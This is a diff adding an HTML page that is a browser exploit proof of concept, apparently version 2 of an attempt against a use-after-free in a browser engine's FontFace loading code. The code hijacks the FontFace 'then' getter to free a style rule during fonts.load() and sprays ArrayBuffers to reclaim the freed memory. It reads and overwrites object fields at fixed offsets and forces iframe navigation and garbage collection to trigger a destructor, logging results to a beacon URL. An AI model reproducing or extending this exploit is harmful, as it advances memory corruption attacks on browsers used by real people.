@@ -1,0 +1,281 @@
+<!--
+  p655 v2: iframe navigation GC trigger
+
+  v1 finding: iframe.remove() does NOT trigger GC collection of the
+  FontFace wrapper — rc stayed at 3 through 80 polls. The DeferredPromise
+  from fonts.load() acts as a GC root keeping the Promise.all chain alive.
+
+  v2 hypothesis: NAVIGATING the iframe to about:blank forces a Document
+  replacement. The old Document's ScriptExecutionContext is destroyed,
+  ActiveDOMObjects are stopped, DeferredPromise is released, the JS
+  Promise chain becomes unreachable, and GC can collect the wrapper.
+
+  Strategy:
+    1. Same UAF setup as v1 (iframe + parent spray)
+    2. After reclaim: null +0x58, capture WeakRef to iframe's ffA
+    3. Clear iframe fonts + navigate to about:blank
+    4. Wait 500ms for navigation to complete
+    5. Remove iframe from DOM
+    6. GC pressure + WeakRef polling
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p655</title></head>
+<body>p655 v2: iframe nav GC
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P655-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'v2-nav');
+flush();
+
+// --- Parent spray ---
+var bufs = [];
+
+window.doSpray = function() {
+  for (var i = 0; i < 80; i++) {
+    var ab = new ArrayBuffer(192);
+    var dv = new DataView(ab);
+    dv.setUint32(0x00, 2, true);
+    dv.setUint32(0x04, 0xDEAD0655, true);
+    bufs.push({ u8: new Uint8Array(ab), dv: dv });
+  }
+};
+
+window.emit = emit;
+
+// --- Create iframe ---
+var ifr = document.createElement('iframe');
+ifr.style.display = 'none';
+document.body.appendChild(ifr);
+
+var iDoc = ifr.contentDocument;
+iDoc.open();
+iDoc.write([
+  '<!DOCTYPE html><html><head></head><body>',
+  '<script>',
+  '(function() {',
+  '  var sty = document.createElement("style");',
+  '  sty.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";',
+  '  document.head.appendChild(sty);',
+  '',
+  '  var ffA = new FontFace("fa", "local(Helvetica)", { unicodeRange: "U+0041" });',
+  '  document.fonts.add(ffA);',
+  '  void ffA.loaded;',
+  '  window.ffA = ffA;',  // expose for parent WeakRef
+  '',
+  '  var fired = false;',
+  '  Object.defineProperty(FontFace.prototype, "then", {',
+  '    configurable: true,',
+  '    get: function() {',
+  '      if (fired) return undefined;',
+  '      fired = true;',
+  '      sty.remove();',
+  '      document.body.offsetHeight;',
+  '      try { parent.doSpray(); } catch(e) { try { parent.emit("SPRAY-ERR", String(e).slice(0,80)); } catch(e2) {} }',
+  '      return undefined;',
+  '    },',
+  '    set: function() {}',
+  '  });',
+  '',
+  '  document.fonts.load("1em fa, sa", "AB");',
+  '  try { parent.emit("IFRAME", "trigger-sent fonts.size=" + document.fonts.size); } catch(e) {}',
+  '})();',
+  '<\/script></body></html>'
+].join('\n'));
+iDoc.close();
+
+emit('IFRAME-CREATED', 'bufs=' + bufs.length);
+flush();
+
+// Phase 1: Check reclaim
+setTimeout(function() {
+try {
+  emit('CHECK', 'bufs=' + bufs.length);
+
+  var hit = -1;
+  for (var i = 0; i < bufs.length; i++) {
+    var rc = bufs[i].dv.getUint32(0x00, true);
+    if (rc !== 2) { hit = i; break; }
+  }
+  if (hit < 0) {
+    for (var i = 0; i < bufs.length; i++) {
+      if (bufs[i].dv.getUint32(0x58, true) !== 0 || bufs[i].dv.getUint32(0x5C, true) !== 0) {
+        hit = i; break;
+      }
+    }
+  }
+
+  if (hit < 0) {
+    emit('MISS', 'no reclaim (' + bufs.length + ' checked)');
+    flush();
+    return;
+  }
+
+  // --- Reclaim succeeded ---
+  var dv = bufs[hit].dv;
+  var rc   = dv.getUint32(0x00, true);
+  var mark = dv.getUint32(0x04, true);
+  var T_lo = dv.getUint32(0x58, true);
+  var T_hi = dv.getUint32(0x5C, true);
+  var W_lo = dv.getUint32(0x68, true);
+  var W_hi = dv.getUint32(0x6C, true);
+
+  emit('P1', 'hit=' + hit + ' rc=' + rc + ' mark=0x' + hex32(mark));
+  emit('TW', 'T=' + hex32(T_hi) + hex32(T_lo) + ' W=' + hex32(W_hi) + hex32(W_lo));
+  flush();
+
+  // Phase 2: Capture WeakRef to iframe's ffA before destroying it
+  var wr = null;
+  var wrOk = false;
+  try {
+    var ifrFFa = ifr.contentWindow.ffA;
+    if (ifrFFa && typeof WeakRef !== 'undefined') {
+      wr = new WeakRef(ifrFFa);
+      wrOk = true;
+    }
+    ifrFFa = null; // drop strong ref immediately
+  } catch(e) {
+    emit('WR-ERR', String(e).slice(0, 60));
+  }
+  emit('WR', 'captured=' + wrOk);
+
+  // Phase 3: Null +0x58 so removeClient skips safely
+  dv.setUint32(0x58, 0, true);
+  dv.setUint32(0x5C, 0, true);
+
+  // Snapshot for change detection
+  var snap = [];
+  for (var j = 0; j < 192; j += 4) snap.push(dv.getUint32(j, true));
+
+  emit('PREP', '+0x58 nulled');
+  flush();
+
+  // Phase 4: Clean up iframe internals THEN navigate
+  try {
+    ifr.contentWindow.document.fonts.clear();
+    emit('CLEANUP', 'fonts.clear() ok');
+  } catch(e) {
+    emit('CLEANUP', 'fonts.clear() err: ' + String(e).slice(0, 40));
+  }
+
+  // Navigate iframe to about:blank — this replaces the Document
+  try {
+    ifr.contentWindow.location.replace('about:blank');
+    emit('NAV', 'location.replace(about:blank) sent');
+  } catch(e) {
+    emit('NAV-ERR', String(e).slice(0, 60));
+    // Fallback: try srcdoc
+    try {
+      ifr.srcdoc = '';
+      emit('NAV', 'srcdoc fallback sent');
+    } catch(e2) {
+      emit('NAV-ERR2', String(e2).slice(0, 60));
+    }
+  }
+  flush();
+
+  // Phase 5: Wait for navigation, then remove iframe, then GC
+  setTimeout(function() {
+    // Check WeakRef before removal
+    var aliveBeforeRemove = wr ? (wr.deref() !== undefined) : 'n/a';
+    emit('PRE-REMOVE', 'alive=' + aliveBeforeRemove + ' rc=' + dv.getUint32(0, true));
+
+    // Remove iframe from DOM
+    try { ifr.remove(); } catch(e) {}
+    ifr = null;
+    iDoc = null;
+
+    emit('REMOVED', 'iframe gone');
+    flush();
+
+    // Phase 6: GC pressure + poll
+    var gcCount = 0;
+    var maxPolls = 80;
+
+    function gcPoll() {
+      gcCount++;
+
+      // Heavy allocation pressure
+      var g = [];
+      for (var k = 0; k < 500; k++) g.push(new ArrayBuffer(65536));
+      g = null;
+
+      var curRc = dv.getUint32(0x00, true);
+      var alive = wr ? (wr.deref() !== undefined) : 'n/a';
+
+      // Check for ANY buffer changes
+      var changed = false;
+      var changes = [];
+      for (var j = 0; j < 192; j += 4) {
+        var cur = dv.getUint32(j, true);
+        if (cur !== snap[j / 4]) {
+          changed = true;
+          changes.push('+' + j.toString(16) + ':' + hex32(snap[j/4]) + '>' + hex32(cur));
+          snap[j / 4] = cur;
+        }
+      }
+
+      if (gcCount === 1 || gcCount === 3 || gcCount === 5 || gcCount === 10 ||
+          gcCount === 20 || gcCount === 40 || gcCount === 60 || gcCount === 80 ||
+          changed || alive === false) {
+        emit('GC', 'n=' + gcCount + ' rc=' + curRc + ' alive=' + alive);
+
+        if (changed) {
+          emit('CHANGED', changes.slice(0, 10).join(' '));
+        }
+
+        if (curRc !== rc) {
+          emit('DESTRUCTOR', 'rc ' + rc + ' -> ' + curRc + ' — deref ran!');
+          var full = [];
+          for (var j = 0; j < 192; j += 8) {
+            full.push('+' + j.toString(16) + '=' +
+              hex32(dv.getUint32(j+4, true)) + hex32(dv.getUint32(j, true)));
+          }
+          emit('FULL', full.join(' '));
+          flush();
+          return;
+        }
+
+        if (alive === false && curRc === rc) {
+          emit('COLLECTED', 'WeakRef dead but rc unchanged — wrapper freed WITHOUT destructor?');
+          flush();
+        }
+        flush();
+      }
+
+      if (gcCount < maxPolls) {
+        setTimeout(gcPoll, 150);
+      } else {
+        emit('END', 'rc=' + curRc + ' alive=' + alive + ' after ' + maxPolls + ' polls');
+        flush();
+      }
+    }
+
+    setTimeout(gcPoll, 50);
+  }, 500); // 500ms for navigation to complete
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
+}, 100);
+
+})();
+</script>
+</body></html>
